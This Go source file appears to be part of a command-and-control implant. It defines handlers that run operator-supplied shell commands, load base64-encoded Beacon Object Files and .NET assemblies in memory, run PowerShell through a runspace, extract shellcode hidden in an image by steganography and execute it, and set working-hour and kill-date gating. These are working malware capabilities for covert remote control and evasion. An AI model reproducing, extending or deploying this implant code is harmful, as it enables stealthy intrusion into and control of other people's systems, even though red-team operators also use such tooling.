package main

import (
	"encoding/base64"
	"fmt"
	"strconv"
	"strings"

	agentexec "github.com/mjopsec/taburtuaiC2/implant/exec"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

func handleExecute(agent *Agent, cmd *types.Command, result *types.CommandResult) {
	method := "cmd"
	if agent != nil && agent.cfg != nil && agent.cfg.ExecMethod != "" {
		method = agent.cfg.ExecMethod
	}
	timeout := cmd.Timeout
	if timeout <= 0 {
		timeout = 60
	}
	stdout, stderr, exitCode := agentexec.RunCommand(method, cmd.Command, timeout)
	result.Output = stdout
	result.Error = stderr
	result.ExitCode = exitCode
}

func handleBOFExec(cmd *types.Command, result *types.CommandResult) {
	if cmd.BOFData == "" {
		result.Error = "bof_data (base64 COFF) required"
		result.ExitCode = 1
		return
	}
	coffBytes, err := base64.StdEncoding.DecodeString(cmd.BOFData)
	if err != nil {
		result.Error = fmt.Sprintf("bof_data decode: %v", err)
		result.ExitCode = 1
		return
	}
	var args []byte
	if cmd.BOFArgs != "" {
		args, _ = base64.StdEncoding.DecodeString(cmd.BOFArgs)
	}
	res, err := agentexec.RunBOF(coffBytes, args)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = res.Output
	if res.Err != "" {
		result.Error = res.Err
	}
}

func handleDotnetExec(cmd *types.Command, result *types.CommandResult) {
	asmPath := cmd.SourcePath
	if asmPath == "" {
		result.Error = "source_path (assembly .dll path) required"
		result.ExitCode = 1
		return
	}
	typeName := cmd.TokenUser
	if typeName == "" {
		result.Error = "token_user (type name) required"
		result.ExitCode = 1
		return
	}
	methodName := cmd.TokenArgs
	if methodName == "" {
		result.Error = "token_args (method name) required"
		result.ExitCode = 1
		return
	}
	argument := cmd.TokenPass
	retCode, err := agentexec.DotnetExecute(asmPath, typeName, methodName, argument)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] .NET %s.%s() returned %d", typeName, methodName, retCode)
}

func handlePSRunspace(cmd *types.Command, result *types.CommandResult) {
	script := cmd.Command
	if script == "" && len(cmd.Args) > 0 {
		script = strings.Join(cmd.Args, " ")
	}
	if script == "" {
		result.Error = "command (PowerShell script) required"
		result.ExitCode = 1
		return
	}
	bridgePath := cmd.SourcePath
	out, err := agentexec.PsRunspace(script, bridgePath)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = out
}

func handleStegoExtract(cmd *types.Command, result *types.CommandResult) {
	imgPath := cmd.SourcePath
	if imgPath == "" {
		result.Error = "source_path (image file) required"
		result.ExitCode = 1
		return
	}
	var key byte
	if cmd.InjectMethod != "" {
		n, _ := strconv.ParseUint(cmd.InjectMethod, 0, 8)
		key = byte(n)
	}
	if err := agentexec.StegoExtractAndRun(imgPath, key); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Shellcode extracted from %s and executed", imgPath)
}

func handleTimeGateSet(agent *Agent, cmd *types.Command, result *types.CommandResult) {
	tg := &agentexec.TimeGate{
		WorkStart: cmd.WorkingHoursStart,
		WorkEnd:   cmd.WorkingHoursEnd,
		KillDate:  cmd.KillDate,
	}
	if tg.WorkStart == 0 && tg.WorkEnd == 0 {
		tg.WorkStart = -1
		tg.WorkEnd = -1
	}
	agent.timeGate = tg
	ok, reason := tg.IsActive()
	if !ok {
		result.Output = fmt.Sprintf("[timegate] Set. Currently INACTIVE: %s", reason)
	} else {
		result.Output = fmt.Sprintf("[timegate] Set. Currently ACTIVE. Kill=%s, Hours=%02d-%02d",
			cmd.KillDate, cmd.WorkingHoursStart, cmd.WorkingHoursEnd)
	}
}
